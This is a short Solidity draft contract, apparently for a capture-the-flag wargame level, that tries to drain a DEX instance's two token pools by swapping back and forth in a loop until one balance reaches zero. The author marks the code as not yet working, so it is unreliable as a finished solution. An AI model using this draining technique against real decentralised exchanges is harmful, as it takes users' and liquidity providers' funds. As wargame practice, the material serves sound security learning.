//WARNING: This code does not yet work, right now it's just my thoughts on paper.

pragma solidity ^0.8.0;

interface IDex {
    function approve(address spender, uint amount) external;
    function swap(address from, address to, uint amount) external;
    function balanceOf(address token, address account) external view returns(uint);
} 

contract AttackDex {
    address dexAddress = YOUR_INSTANCE_ADDRESS;
    IDex dexContract = IDex(dexAddress);
    
    address token1Address = TKN1_ADDRESS;
    address token2Address = TKN2_ADDRESS;
    address playerAddress = YOUR_PLAYER_ADDRESS;
    
    uint _amount = 10;
    
    function _newApprove() private {
        dexContract.approve(dexAddress, _amount);
    }
    
    function _swap1to2() private {
        dexContract.swap(token1Address, token2Address, _amount);
        _amount = (dexContract.balanceOf(token2Address, playerAddress));
        _newApprove();
    } 
    
    function _swap2to1() private {
        dexContract.swap(token2Address, token1Address, _amount);
        _amount = (dexContract.balanceOf(token1Address, playerAddress)); 
        _newApprove();
    }
    
    //Re-work this section
     function pwn() public {
        _newApprove();
        
        do {
            _swap1to2();
            _swap2to1();
        } while (dexContract.balanceOf(token1Address, dexAddress) > 0 && dexContract.balanceOf(token2Address, dexAddress) > 0);
            
        return;
    } 
}
